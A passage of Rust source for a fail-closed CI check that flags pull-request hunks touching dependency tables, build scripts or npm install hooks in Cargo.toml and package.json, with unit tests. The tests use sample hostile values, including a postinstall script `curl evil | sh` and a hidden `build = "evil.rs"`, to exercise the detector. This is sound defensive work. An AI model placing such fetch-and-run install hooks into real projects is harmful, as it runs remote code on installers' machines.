//! `loom-daemon forge suspect-critical-diff <pr> <file>` (#12999) — the
//! fail-closed, hunk-aware decision behind Champion criterion #3's second
//! carve-out, beside `forge version-only-diff` (#9611).
//!
//! # What the question is
//!
//! Criterion #3 holds any PR whose file list matches `CRITICAL_PATTERNS`. For
//! `Cargo.toml` / `package.json` that held harmless edits too (#12976 added two
//! `[[bin]]` entries to `loom-daemon/Cargo.toml`). The operator ruled
//! (2026-10-21) to hold only on *suspect* hunks. This verb answers, for one
//! changed manifest: does any `+`/`-` line touch a suspect surface?
//!
//! Suspect (`Cargo.toml`): a changed line inside `[dependencies]`,
//! `[dev-dependencies]`, `[build-dependencies]`, `[target.*.dependencies]`,
//! `[workspace.dependencies]`, `[patch.*]`, `[replace]` or `[features]` (a
//! dependency sub-table such as `[dependencies.foo]` included); a changed
//! `build =` / `links =` line anywhere; a changed `git =` / `registry =` /
//! `path =` source key anywhere except a `path =` line directly in a target
//! table (`[[bin]]`, `[[bench]]`, `[[test]]`, `[[example]]`, `[lib]`), where
//! it is the target's source file, not a dependency.
//!
//! Suspect (`package.json`): a changed line at or under `dependencies`,
//! `devDependencies`, `optionalDependencies`, `peerDependencies`, `overrides`
//! or `resolutions` (at any nesting, so `pnpm.overrides` counts), or under
//! `scripts` at `preinstall` / `install` / `postinstall` / `prepare`.
//!
//! # Section tracking
//!
//! The patch is read as two views, old (context + `-`) and new (context +
//! `+`), each driven through a small line scanner. The state before a hunk is
//! identical in both views (the file is unchanged above it), so a hunk that
//! starts mid-section with no visible header takes its starting state from the
//! file's contents at the PR head, lines `1..new_start`. That read is made
//! only when a changed line needs it; if it fails the file holds.
//!
//! # Fail closed
//!
//! Exit 0 (`SUSPECT=0` on stdout) requires every fetched page of the file list
//! to have parsed, the file to carry a non-empty `patch`, at least one changed
//! line, every hunk header and body line to parse, and no changed line to be
//! suspect. A suspect line exits 1 with `SUSPECT_LINE=<line>` and
//! `SUSPECT_SECTION=<section>` on stdout; every other outcome exits 1 with a
//! reason on stderr. A caller treats **any** non-zero exit (clap's 2 on a
//! daemon predating this verb, 126/127 for a missing binary) as a hold.

use std::path::Path;

use anyhow::Result;
use regex::Regex;

/// Dependency-ish `Cargo.toml` table-name segments.
const CARGO_SUSPECT_SEGMENTS: [&str; 6] = [
    "dependencies",
    "dev-dependencies",
    "build-dependencies",
    "patch",
    "replace",
    "features",
];

/// `Cargo.toml` tables whose `path =` key is the target's own source file.
const CARGO_TARGET_TABLES: [&str; 5] = ["bin", "bench", "test", "example", "lib"];

/// `package.json` keys that make everything at or under them suspect.
const JSON_SUSPECT_KEYS: [&str; 6] = [
    "dependencies",
    "devDependencies",
    "optionalDependencies",
    "peerDependencies",
    "overrides",
    "resolutions",
];

/// `package.json` `scripts` entries npm runs on install.
const JSON_LIFECYCLE_SCRIPTS: [&str; 4] = ["preinstall", "install", "postinstall", "prepare"];

/// A changed line that touches a suspect surface.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Suspect {
    /// The matched `+`/`-` line, verbatim (with its prefix).
    pub line: String,
    /// The enclosing section or key path (`dependencies`, `scripts.postinstall`).
    pub section: String,
}

/// Why a file is NOT cleared. Every variant exits 1.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Reason {
    /// Not a `Cargo.toml` or `package.json`.
    NotApplicable,
    /// `--repo` was not a plain `OWNER/REPO`.
    InvalidRepo,
    /// A page fetch failed or did not parse as the expected file list.
    FetchFailed(String),
    /// The file is not in the PR's changed-file list.
    FileNotInList,
    /// The file's entry carries no `patch` (large or binary diff, pure rename).
    PatchAbsent,
    /// The file's `patch` is the empty string.
    PatchEmpty,
    /// The patch has no `+`/`-` content line at all.
    NoChangedLines,
    /// A hunk header or body line did not parse, or a scanner lost track.
    Unparseable(String),
    /// A hunk's enclosing section needed the file at the PR head and the read failed.
    HeadReadFailed(String),
    /// A suspect line.
    Suspect(Suspect),
}

impl std::fmt::Display for Reason {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::NotApplicable => f.write_str("not a Cargo.toml or package.json"),
            Self::InvalidRepo => f.write_str("--repo is not a plain OWNER/REPO"),
            Self::FetchFailed(why) => write!(f, "could not read the PR's file list: {why}"),
            Self::FileNotInList => f.write_str("file is not in the PR's changed-file list"),
            Self::PatchAbsent => f.write_str("the forge returned no patch (large/binary/rename)"),
            Self::PatchEmpty => f.write_str("the forge returned an empty patch"),
            Self::NoChangedLines => f.write_str("the patch has no +/- content line"),
            Self::Unparseable(why) => write!(f, "patch could not be classified: {why}"),
            Self::HeadReadFailed(why) => write!(f, "could not read the file at the PR head: {why}"),
            Self::Suspect(s) => write!(f, "suspect line in [{}]: {}", s.section, s.line),
        }
    }
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Kind {
    Cargo,
    PackageJson,
}

fn kind_for(file: &str) -> Option<Kind> {
    match file.rsplit('/').next()? {
        "Cargo.toml" => Some(Kind::Cargo),
        "package.json" => Some(Kind::PackageJson),
        _ => None,
    }
}

// ---------------------------------------------------------------- Cargo.toml

/// Where a view currently is in a `Cargo.toml`.
#[derive(Clone, PartialEq, Eq, Debug)]
enum Section {
    /// Before any table header.
    Top,
    /// Inside a table.
    Table {
        name: String,
        suspect: bool,
        target: bool,
    },
    /// A `[`-led line that is not a table header: nothing below it is trusted.
    Unknown,
}

fn header_re() -> Regex {
    // Name must start like a bare key so `["a"],` array rows do not match.
    #[allow(clippy::unwrap_used)] // constant pattern, covered by the tests
    Regex::new(r"^\s*(\[\[?)\s*([A-Za-z0-9_][^\]]*?)\s*\]\]?\s*(#.*)?$").unwrap()
}

/// Split a dotted TOML table name into unquoted segments.
fn table_segments(name: &str) -> Vec<String> {
    let (mut segs, mut cur, mut quote) = (Vec::new(), String::new(), None::<char>);
    for c in name.chars() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some(_), c) => cur.push(c),
            (None, '"' | '\'') => quote = Some(c),
            (None, '.') => segs.push(std::mem::take(&mut cur).trim().to_string()),
            (None, c) => cur.push(c),
        }
    }
    segs.push(cur.trim().to_string());
    segs
}

fn classify_table(name: &str) -> Section {
    let segs = table_segments(name);
    let suspect = segs
        .iter()
        .any(|s| CARGO_SUSPECT_SEGMENTS.contains(&s.as_str()));
    let target = segs.len() == 1 && CARGO_TARGET_TABLES.contains(&segs[0].as_str());
    Section::Table {
        name: name.to_string(),
        suspect,
        target,
    }
}

/// The section a line leaves the view in; `None` when it is not a header.
fn cargo_header(re: &Regex, content: &str) -> Option<Result<Section, ()>> {
    let t = content.trim_start();
    if !t.starts_with('[') {
        return None;
    }
    Some(match re.captures(content) {
        Some(c) => Ok(classify_table(&c[2])),
        None => Err(()),
    })
}

struct CargoView {
    /// `None` until a header is seen or the prefix is resolved.
    section: Option<Section>,
}

fn key_re() -> (Regex, Regex, Regex) {
    #[allow(clippy::unwrap_used)] // constant patterns, covered by the tests
    (
        Regex::new(r"^\s*(build|links)\s*=").unwrap(),
        Regex::new(r"(^|[{,])\s*(git|registry|path)\s*=").unwrap(),
        Regex::new(r"^\s*path\s*=").unwrap(),
    )
}

// ---------------------------------------------------------------- package.json

/// A string-aware line scanner tracking the JSON key path across lines.
#[derive(Clone, Default)]
struct JsonScan {
    /// One entry per open `{`/`[`: the key it was opened under ("" for none).
    stack: Vec<String>,
    pending_key: Option<String>,
    poisoned: bool,
}

impl JsonScan {
    fn path(&self) -> Vec<&str> {
        self.stack
            .iter()
            .map(String::as_str)
            .filter(|s| !s.is_empty())
            .collect()
    }

    /// Feed one line; return every key path seen on it (`path_at_key + key`)
    /// plus the path in force at the line start.
    fn feed(&mut self, line: &str) -> (Vec<String>, Vec<String>) {
        let start: Vec<String> = self.path().iter().map(|s| (*s).to_string()).collect();
        let mut keys = Vec::new();
        let chars: Vec<char> = line.chars().collect();
        let mut i = 0;
        while i < chars.len() {
            match chars[i] {
                '"' => {
                    let mut s = String::new();
                    i += 1;
                    let mut closed = false;
                    while i < chars.len() {
                        match chars[i] {
                            '\\' => {
                                s.push(chars[i]);
                                if let Some(n) = chars.get(i + 1) {
                                    s.push(*n);
                                }
                                i += 2;
                                continue;
                            }
                            '"' => {
                                closed = true;
                                break;
                            }
                            c => s.push(c),
                        }
                        i += 1;
                    }
                    if !closed {
                        self.poisoned = true;
                        return (start, keys);
                    }
                    let mut j = i + 1;
                    while chars.get(j).is_some_and(|c| c.is_whitespace()) {
                        j += 1;
                    }
                    if chars.get(j) == Some(&':') {
                        let mut p: Vec<String> =
                            self.path().iter().map(|s| (*s).to_string()).collect();
                        p.push(s.clone());
                        keys.push(p.join("."));
                        self.pending_key = Some(s);
                        i = j;
                    }
                }
                '{' | '[' => {
                    self.stack.push(self.pending_key.take().unwrap_or_default());
                }
                '}' | ']' => {
                    if self.stack.pop().is_none() {
                        self.poisoned = true;
                    }
                    self.pending_key = None;
                }
                ',' => self.pending_key = None,
                _ => {}
            }
            i += 1;
        }
        (start, keys)
    }
}

/// Is a dotted-by-element key path a suspect `package.json` surface?
fn json_path_suspect(path: &[&str]) -> bool {
    if path.iter().any(|p| JSON_SUSPECT_KEYS.contains(p)) {
        return true;
    }
    path.first() == Some(&"scripts")
        && path
            .get(1)
            .is_some_and(|p| JSON_LIFECYCLE_SCRIPTS.contains(p))
}

fn json_line_suspect(scan: &mut JsonScan, content: &str) -> Result<Option<String>, Reason> {
    let (start, keys) = scan.feed(content);
    if scan.poisoned {
        return Err(Reason::Unparseable("package.json structure lost".into()));
    }
    let as_refs = |p: &str| p.split('.').map(str::to_string).collect::<Vec<_>>();
    // Key names never contain a literal '.' here: a dotted key (`"a.b"`) only
    // widens the match, and widening holds.
    for k in keys {
        let parts = as_refs(&k);
        let refs: Vec<&str> = parts.iter().map(String::as_str).collect();
        if json_path_suspect(&refs) {
            return Ok(Some(k));
        }
    }
    let refs: Vec<&str> = start.iter().map(String::as_str).collect();
    if json_path_suspect(&refs) {
        return Ok(Some(start.join(".")));
    }
    Ok(None)
}

// ---------------------------------------------------------------- the decision

struct Hunk {
    new_start: usize,
}

fn parse_hunk_header(line: &str) -> Option<Hunk> {
    #[allow(clippy::unwrap_used)] // constant pattern, covered by the tests
    let re = Regex::new(r"^@@ -(\d+)(?:,\d+)? \+(\d+)(?:,\d+)? @@").unwrap();
    let c = re.captures(line)?;
    Some(Hunk {
        new_start: c[2].parse().ok()?,
    })
}

/// The pure decision. `head_file` reads the file's contents at the PR head and
/// is called at most once, only when a hunk's section cannot be told from the
/// patch alone.
///
/// # Errors
///
/// The [`Reason`] the file is not cleared (including [`Reason::Suspect`]).
pub fn classify<H>(file: &str, patch: Option<&str>, mut head_file: H) -> Result<(), Reason>
where
    H: FnMut() -> Result<String, String>,
{
    let kind = kind_for(file).ok_or(Reason::NotApplicable)?;
    let patch = patch.ok_or(Reason::PatchAbsent)?;
    if patch.is_empty() {
        return Err(Reason::PatchEmpty);
    }
    let mut head: Option<String> = None;
    let mut fetch = |head: &mut Option<String>| -> Result<(), Reason> {
        if head.is_none() {
            *head = Some(head_file().map_err(Reason::HeadReadFailed)?);
        }
        Ok(())
    };
    let hre = header_re();
    let (re_build, re_src, re_path) = key_re();

    let mut changed = 0usize;
    let mut hunk: Option<Hunk> = None;
    let mut old_c = CargoView { section: None };
    let mut new_c = CargoView { section: None };
    let (mut old_j, mut new_j) = (JsonScan::default(), JsonScan::default());

    for line in patch.split('\n') {
        let line = line.strip_suffix('\r').unwrap_or(line);
        if line.starts_with("@@") {
            let h = parse_hunk_header(line)
                .ok_or_else(|| Reason::Unparseable(format!("hunk header: {line}")))?;
            // Fresh views for the hunk.
            old_c = CargoView { section: None };
            new_c = CargoView { section: None };
            (old_j, new_j) = (JsonScan::default(), JsonScan::default());
            if kind == Kind::PackageJson && h.new_start > 1 {
                fetch(&mut head)?;
                let prefix: Vec<&str> = head
                    .as_deref()
                    .unwrap_or("")
                    .lines()
                    .take(h.new_start - 1)
                    .collect();
                if prefix.len() < h.new_start - 1 {
                    return Err(Reason::HeadReadFailed("file shorter than the hunk start".into()));
                }
                for l in prefix {
                    new_j.feed(l);
                }
                if new_j.poisoned {
                    return Err(Reason::Unparseable("package.json prefix".into()));
                }
                old_j = new_j.clone();
            }
            if kind == Kind::Cargo && h.new_start <= 1 {
                old_c.section = Some(Section::Top);
                new_c.section = Some(Section::Top);
            }
            hunk = Some(h);
            continue;
        }
        let Some(h) = hunk.as_ref() else {
            continue; // before the first hunk: nothing the forge puts here is content
        };
        if line.starts_with('\\') {
            continue; // "\ No newline at end of file"
        }
        let (prefix, content) = match line.chars().next() {
            None => (' ', ""),
            Some(c @ (' ' | '+' | '-')) => (c, &line[1..]),
            Some(_) => return Err(Reason::Unparseable(format!("hunk line: {line}"))),
        };
        let is_change = prefix != ' ';
        if is_change {
            changed += 1;
        }
        let in_old = prefix != '+';
        let in_new = prefix != '-';

        match kind {
            Kind::PackageJson => {
                for (on, scan) in [(in_old, &mut old_j), (in_new, &mut new_j)] {
                    if !on {
                        continue;
                    }
                    if is_change {
                        if let Some(sec) = json_line_suspect(scan, content)? {
                            return Err(Reason::Suspect(Suspect {
                                line: line.to_string(),
                                section: sec,
                            }));
                        }
                    } else {
                        scan.feed(content);
                        if scan.poisoned {
                            return Err(Reason::Unparseable("package.json structure lost".into()));
                        }
                    }
                }
            }
            Kind::Cargo => {
                for (on, view) in [(in_old, &mut old_c), (in_new, &mut new_c)] {
                    if !on {
                        continue;
                    }
                    let header = cargo_header(&hre, content);
                    let blank = content.trim().is_empty() || content.trim_start().starts_with('#');
                    // Resolve the starting section from the head file only when
                    // a non-trivial line is reached with no header seen yet.
                    if view.section.is_none() && header.is_none() && !blank && is_change {
                        fetch(&mut head)?;
                        let prefix: Vec<&str> = head
                            .as_deref()
                            .unwrap_or("")
                            .lines()
                            .take(h.new_start.saturating_sub(1))
                            .collect();
                        if prefix.len() < h.new_start.saturating_sub(1) {
                            return Err(Reason::HeadReadFailed(
                                "file shorter than the hunk start".into(),
                            ));
                        }
                        let mut s = Section::Top;
                        for l in prefix {
                            if let Some(r) = cargo_header(&hre, l) {
                                s = r.unwrap_or(Section::Unknown);
                            }
                        }
                        view.section = Some(s);
                    }
                    if let Some(hd) = header {
                        let sec = hd.unwrap_or(Section::Unknown);
                        if is_change {
                            match &sec {
                                Section::Unknown => {
                                    return Err(Reason::Unparseable(format!(
                                        "table header: {line}"
                                    )))
                                }
                                Section::Table {
                                    name,
                                    suspect: true,
                                    ..
                                } => {
                                    return Err(Reason::Suspect(Suspect {
                                        line: line.to_string(),
                                        section: name.clone(),
                                    }))
                                }
                                _ => {}
                            }
                        }
                        view.section = Some(sec);
                        continue;
                    }
                    if !is_change || blank {
                        continue;
                    }
                    let (name, suspect, target) = match &view.section {
                        Some(Section::Table {
                            name,
                            suspect,
                            target,
                        }) => (name.as_str(), *suspect, *target),
                        Some(Section::Top) => ("(top level)", false, false),
                        Some(Section::Unknown) | None => {
                            return Err(Reason::Unparseable(format!("no section for: {line}")))
                        }
                    };
                    let hit = suspect
                        || re_build.is_match(content)
                        || if target && re_path.is_match(content) {
                            // A target's own `path =`: only inline-table sources count.
                            false
                        } else {
                            re_src.is_match(content)
                        };
                    if hit {
                        return Err(Reason::Suspect(Suspect {
                            line: line.to_string(),
                            section: name.to_string(),
                        }));
                    }
                }
            }
        }
    }
    if changed == 0 {
        return Err(Reason::NoChangedLines);
    }
    Ok(())
}

/// Reject file names that could address a different API endpoint.
fn safe_path(file: &str) -> bool {
    !file.is_empty()
        && !file.starts_with('/')
        && !file
            .split('/')
            .any(|p| p.is_empty() || p == "." || p == "..")
        && file
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-' | b'/'))
}

/// Decode a `repos/<r>/contents/<f>?ref=<sha>` JSON body to text.
fn decode_contents(body: &[u8]) -> Result<String, String> {
    use base64::engine::general_purpose::STANDARD;
    use base64::Engine as _;
    let v: serde_json::Value = serde_json::from_slice(body).map_err(|e| e.to_string())?;
    if v.get("encoding").and_then(|e| e.as_str()) != Some("base64") {
        return Err("contents API returned no base64 body".into());
    }
    let raw: String = v
        .get("content")
        .and_then(|c| c.as_str())
        .ok_or("contents API returned no content")?
        .split_whitespace()
        .collect();
    let bytes = STANDARD.decode(raw).map_err(|e| e.to_string())?;
    String::from_utf8(bytes).map_err(|e| e.to_string())
}

fn gh_head_file(gh_bin: &Path, repo: &str, pr: u32, file: &str) -> Result<String, String> {
    if !safe_path(file) {
        return Err("unsafe file path".into());
    }
    let read = |path: &str| {
        crate::verdict_equivalence::gh_api("forge.suspect_critical_diff", gh_bin, None, path)
            .ok_or_else(|| format!("`gh api {path}` failed"))
    };
    let pr_body = read(&format!("repos/{repo}/pulls/{pr}"))?;
    let v: serde_json::Value = serde_json::from_slice(&pr_body).map_err(|e| e.to_string())?;
    let sha = v
        .pointer("/head/sha")
        .and_then(|s| s.as_str())
        .filter(|s| s.len() >= 7 && s.bytes().all(|b| b.is_ascii_hexdigit()))
        .ok_or("PR head sha missing")?;
    decode_contents(&read(&format!("repos/{repo}/contents/{file}?ref={sha}"))?)
}

/// Parsed `forge suspect-critical-diff` arguments.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Args {
    /// Pull request number.
    pub pr: u32,
    /// Repo-relative path of the changed file.
    pub file: String,
    /// `OWNER/REPO`; `None` lets `gh` resolve `{owner}/{repo}`.
    pub repo: Option<String>,
}

/// Handle `loom-daemon forge suspect-critical-diff <pr> <file> [--repo OWNER/REPO]`.
/// Never returns (exits): 0 with `SUSPECT=0` when no changed line is suspect,
/// otherwise 1 (`SUSPECT_LINE=`/`SUSPECT_SECTION=` on stdout for a match, the
/// reason on stderr).
pub fn handle(args: &Args) -> Result<()> {
    use crate::forge_version_only_diff::{find_patch, gh_fetch_page, valid_repo};
    let (pr, file) = (args.pr, args.file.as_str());
    let repo = args.repo.as_deref();
    let verdict = match repo {
        Some(r) if !valid_repo(r) => Err(Reason::InvalidRepo),
        _ if kind_for(file).is_none() => Err(Reason::NotApplicable),
        _ => {
            let repo = repo.unwrap_or("{owner}/{repo}");
            let gh = crate::forge_cmd::gh_bin();
            let gh = Path::new(&gh);
            match find_patch(file, |page| gh_fetch_page(gh, repo, pr, page)) {
                Ok(patch) => classify(file, patch.as_deref(), || gh_head_file(gh, repo, pr, file)),
                Err(r) => Err(match r {
                    crate::forge_version_only_diff::Reason::FileNotInList => Reason::FileNotInList,
                    other => Reason::FetchFailed(other.to_string()),
                }),
            }
        }
    };
    match verdict {
        Ok(()) => {
            println!("SUSPECT=0");
            std::process::exit(0);
        }
        Err(reason) => {
            if let Reason::Suspect(s) = &reason {
                println!("SUSPECT_LINE={}", s.line);
                println!("SUSPECT_SECTION={}", s.section);
            }
            eprintln!("loom-daemon forge suspect-critical-diff: {file} held: {reason}");
            std::process::exit(1);
        }
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;

    fn no_head() -> Result<String, String> {
        Err("head read not expected".into())
    }

    fn ok(file: &str, patch: &str) {
        assert_eq!(classify(file, Some(patch), no_head), Ok(()), "{patch}");
    }

    fn suspect(file: &str, patch: &str) -> Suspect {
        match classify(file, Some(patch), no_head) {
            Err(Reason::Suspect(s)) => s,
            other => panic!("expected Suspect, got {other:?} for {patch}"),
        }
    }

    // ---- Cargo.toml: not suspect

    /// #12976: two `[[bin]]` entries with `path =` and comments.
    #[test]
    fn pr12976_bin_entries_pass() {
        ok(
            "loom-daemon/Cargo.toml",
            "@@ -90,6 +90,18 @@ tokio-test = \"0.4\"\n serial_test = \"4.0\"\n criterion = \"0.8\"\n \n+# Explicit so `loom-daemon` keeps its name.\n+[[bin]]\n+name = \"loom-daemon\"\n+path = \"src/main.rs\"\n+\n+[[bin]]\n+name = \"loom-tools\"\n+path = \"src/bin/loom_tools.rs\"\n+\n [[bench]]\n name = \"terminal_benchmarks\"\n harness = false",
        );
    }

    #[test]
    fn non_suspect_tables_pass() {
        for (header, added) in [
            ("[[bench]]", "+name = \"b\"\n+harness = false"),
            ("[[test]]", "+name = \"t\""),
            ("[[example]]", "+name = \"e\"\n+path = \"examples/e.rs\""),
            ("[lib]", "+name = \"l\"\n+path = \"src/lib.rs\""),
            ("[package]", "+description = \"x\"\n+edition = \"2021\"\n+license = \"MIT\""),
            ("[package]", "-version = \"1.0.0\"\n+version = \"1.0.1\""),
            ("[profile.release]", "+opt-level = 3"),
        ] {
            ok("Cargo.toml", &format!("@@ -1,1 +1,3 @@\n {header}\n{added}"));
        }
    }

    #[test]
    fn comment_only_lines_inside_dependencies_pass() {
        ok(
            "Cargo.toml",
            "@@ -1,3 +1,4 @@\n [dependencies]\n+# why we pin this\n serde = \"1\"",
        );
    }

    // ---- Cargo.toml: suspect

    #[test]
    fn dependency_tables_are_suspect() {
        for sec in [
            "dependencies",
            "dev-dependencies",
            "build-dependencies",
            "target.'cfg(unix)'.dependencies",
            "target.x86_64-unknown-linux-gnu.dependencies",
            "workspace.dependencies",
            "patch.crates-io",
            "replace",
            "features",
            "dependencies.foo",
        ] {
            let p = format!("@@ -1,2 +1,3 @@\n [{sec}]\n+foo = \"1\"\n bar = \"2\"");
            let s = suspect("Cargo.toml", &p);
            assert_eq!(s.line, "+foo = \"1\"", "{sec}");
            assert_eq!(s.section, sec);
        }
    }

    #[test]
    fn removed_dependency_is_suspect_too() {
        let s =
            suspect("Cargo.toml", "@@ -1,3 +1,2 @@\n [dependencies]\n-serde = \"1\"\n bar = \"2\"");
        assert_eq!(s.line, "-serde = \"1\"");
    }

    #[test]
    fn source_keys_are_suspect_anywhere() {
        for (patch, line) in [
            (
                "@@ -1,2 +1,3 @@\n [package]\n+build = \"build.rs\"\n name = \"x\"",
                "+build = \"build.rs\"",
            ),
            ("@@ -1,2 +1,3 @@\n [package]\n+links = \"z\"\n name = \"x\"", "+links = \"z\""),
            (
                "@@ -1,2 +1,3 @@\n [package]\n+git = \"https://x\"\n name = \"x\"",
                "+git = \"https://x\"",
            ),
            (
                "@@ -1,2 +1,3 @@\n [package]\n+registry = \"r\"\n name = \"x\"",
                "+registry = \"r\"",
            ),
            (
                "@@ -1,2 +1,3 @@\n [package]\n+path = \"../x\"\n name = \"x\"",
                "+path = \"../x\"",
            ),
            (
                "@@ -1,2 +1,3 @@\n [[bin]]\n+build = \"build.rs\"\n name = \"x\"",
                "+build = \"build.rs\"",
            ),
            (
                "@@ -1,2 +1,3 @@\n [[bin]]\n+git = \"https://x\"\n name = \"x\"",
                "+git = \"https://x\"",
            ),
            (
                "@@ -1,2 +1,3 @@\n [profile.dev]\n+foo = { path = \"../x\" }\n name = \"x\"",
                "+foo = { path = \"../x\" }",
            ),
        ] {
            assert_eq!(suspect("Cargo.toml", patch).line, line, "{patch}");
        }
    }

    /// The pressure-test scenario: a harmless `[[bin]]` edit plus a hidden `build =`.
    #[test]
    fn mixed_bin_edit_and_hidden_build_line_is_suspect() {
        let p = "@@ -1,4 +1,8 @@\n [package]\n name = \"x\"\n+build = \"evil.rs\"\n \n+[[bin]]\n+name = \"ok\"\n+path = \"src/ok.rs\"";
        assert_eq!(suspect("Cargo.toml", p).line, "+build = \"evil.rs\"");
    }

    #[test]
    fn suspect_header_line_itself_is_suspect() {
        let s = suspect(
            "Cargo.toml",
            "@@ -1,1 +1,3 @@\n name = \"x\"\n+[dependencies]\n+serde = \"1\"",
        );
        assert_eq!(s.line, "+[dependencies]");
    }

    /// Section is tracked per view: a removed header does not leak into `+` lines.
    #[test]
    fn section_after_changed_header_applies_to_following_lines() {
        let s = suspect(
            "Cargo.toml",
            "@@ -1,3 +1,3 @@\n [package]\n-[lib]\n+[dependencies]\n+x = \"1\"",
        );
        assert_eq!(s.line, "+[dependencies]");
    }

    // ---- Cargo.toml: hunk without a header resolves from the head file

    #[test]
    fn headerless_hunk_resolves_section_from_head_file() {
        let head = "[package]\nname = \"x\"\n\n[dependencies]\nserde = \"1\"\nanyhow = \"1\"\n";
        let p = "@@ -5,1 +5,2 @@\n serde = \"1\"\n+tokio = \"1\"";
        let r = classify("Cargo.toml", Some(p), || Ok(head.to_string()));
        assert!(matches!(r, Err(Reason::Suspect(ref s)) if s.section == "dependencies"), "{r:?}");
        let head = "[package]\nname = \"x\"\nedition = \"2021\"\n";
        let p = "@@ -3,1 +3,2 @@\n edition = \"2021\"\n+license = \"MIT\"";
        assert_eq!(classify("Cargo.toml", Some(p), || Ok(head.to_string())), Ok(()));
    }

    #[test]
    fn headerless_hunk_with_failing_head_read_fails_closed() {
        let p = "@@ -5,1 +5,2 @@\n serde = \"1\"\n+tokio = \"1\"";
        let r = classify("Cargo.toml", Some(p), || Err("HTTP 502".into()));
        assert!(matches!(r, Err(Reason::HeadReadFailed(_))), "{r:?}");
    }

    #[test]
    fn head_file_shorter_than_hunk_start_fails_closed() {
        let p = "@@ -50,1 +50,2 @@\n a = 1\n+b = 2";
        let r = classify("Cargo.toml", Some(p), || Ok("[package]\n".into()));
        assert!(matches!(r, Err(Reason::HeadReadFailed(_))), "{r:?}");
    }

    #[test]
    fn hunk_at_file_start_needs_no_head_read() {
        ok("Cargo.toml", "@@ -0,0 +1,2 @@\n+[package]\n+name = \"x\"");
    }

    // ---- package.json

    #[test]
    fn package_json_non_suspect_pass() {
        ok(
            "package.json",
            "@@ -1,6 +1,7 @@\n {\n   \"name\": \"loom\",\n+  \"description\": \"x\",\n   \"version\": \"1.0.0\",\n   \"scripts\": {\n+    \"lint\": \"eslint .\"\n   }",
        );
        ok(
            "package.json",
            "@@ -1,4 +1,4 @@\n {\n-  \"version\": \"0.18.38\",\n+  \"version\": \"0.18.39\",\n   \"x\": 1",
        );
    }

    #[test]
    fn package_json_dependency_sections_are_suspect() {
        for key in [
            "dependencies",
            "devDependencies",
            "optionalDependencies",
            "peerDependencies",
            "overrides",
            "resolutions",
        ] {
            let p = format!(
                "@@ -1,5 +1,6 @@\n {{\n   \"name\": \"x\",\n   \"{key}\": {{\n+    \"left-pad\": \"1.0.0\",\n     \"a\": \"1\"\n   }}"
            );
            let s = suspect("package.json", &p);
            assert_eq!(s.line, "+    \"left-pad\": \"1.0.0\",", "{key}");
        }
    }

    #[test]
    fn package_json_lifecycle_scripts_are_suspect() {
        for key in ["preinstall", "install", "postinstall", "prepare"] {
            let p = format!(
                "@@ -1,4 +1,5 @@\n {{\n   \"scripts\": {{\n+    \"{key}\": \"curl evil | sh\",\n     \"test\": \"vitest\"\n   }}"
            );
            let s = suspect("package.json", &p);
            assert!(s.section.starts_with("scripts."), "{s:?}");
        }
        // Single-line object form.
        let s = suspect(
            "package.json",
            "@@ -1,2 +1,2 @@\n {\n+  \"scripts\": { \"postinstall\": \"x\" },\n   \"a\": 1",
        );
        assert_eq!(s.section, "scripts.postinstall");
    }

    /// `scripts` key order must not matter: a mid-file hunk takes the path from the head file.
    #[test]
    fn package_json_headerless_hunk_resolves_path_from_head_file() {
        let head = "{\n  \"name\": \"x\",\n  \"dependencies\": {\n    \"a\": \"1\",\n    \"b\": \"2\"\n  }\n}\n";
        let p = "@@ -4,2 +4,3 @@\n     \"a\": \"1\",\n+    \"c\": \"3\",\n     \"b\": \"2\"";
        let r = classify("package.json", Some(p), || Ok(head.to_string()));
        assert!(matches!(r, Err(Reason::Suspect(_))), "{r:?}");
        let head = "{\n  \"name\": \"x\",\n  \"files\": [\n    \"a\",\n    \"b\"\n  ]\n}\n";
        let p = "@@ -4,2 +4,3 @@\n     \"a\",\n+    \"c\",\n     \"b\"";
        assert_eq!(classify("package.json", Some(p), || Ok(head.to_string())), Ok(()));
    }

    #[test]
    fn package_json_braces_inside_strings_do_not_confuse_the_scanner() {
        let head =
            "{\n  \"description\": \"a { b\",\n  \"dependencies\": {\n    \"a\": \"1\"\n  }\n}\n";
        let p = "@@ -4,1 +4,2 @@\n     \"a\": \"1\"\n+    \"b\": \"2\"";
        let r = classify("package.json", Some(p), || Ok(head.to_string()));
        assert!(matches!(r, Err(Reason::Suspect(_))), "{r:?}");
    }

    #[test]
    fn package_json_head_read_failure_fails_closed() {
        let p = "@@ -4,1 +4,2 @@\n     \"a\": \"1\"\n+    \"b\": \"2\"";
        let r = classify("package.json", Some(p), || Err("nope".into()));
        assert!(matches!(r, Err(Reason::HeadReadFailed(_))), "{r:?}");
    }

    // ---- fail closed

    #[test]
    fn missing_empty_or_changeless_patch_fails_closed() {
        assert_eq!(classify("Cargo.toml", None, no_head), Err(Reason::PatchAbsent));
        assert_eq!(classify("Cargo.toml", Some(""), no_head), Err(Reason::PatchEmpty));
        assert_eq!(
            classify("Cargo.toml", Some("@@ -1,1 +1,1 @@\n [package]"), no_head),
            Err(Reason::NoChangedLines)
        );
    }

    #[test]
    fn unparseable_hunks_fail_closed() {
        let r = classify("Cargo.toml", Some("@@ garbage @@\n+a = 1"), no_head);
        assert!(matches!(r, Err(Reason::Unparseable(_))), "{r:?}");
        let r = classify("Cargo.toml", Some("@@ -1,1 +1,2 @@\n a\n?weird"), no_head);
        assert!(matches!(r, Err(Reason::Unparseable(_))), "{r:?}");
        // A `[`-led line that is not a header leaves the section unknown.
        let r = classify("Cargo.toml", Some("@@ -1,1 +1,3 @@\n [broken\n+a = 1"), no_head);
        assert!(matches!(r, Err(Reason::Unparseable(_))), "{r:?}");
        // Unterminated JSON string / unbalanced close.
        let r = classify("package.json", Some("@@ -1,1 +1,2 @@\n {\n+  \"a: 1"), no_head);
        assert!(matches!(r, Err(Reason::Unparseable(_))), "{r:?}");
        let r = classify("package.json", Some("@@ -1,1 +1,2 @@\n {\n+}\n+}"), no_head);
        assert!(matches!(r, Err(Reason::Unparseable(_))), "{r:?}");
    }

    #[test]
    fn other_files_are_not_applicable() {
        for f in [
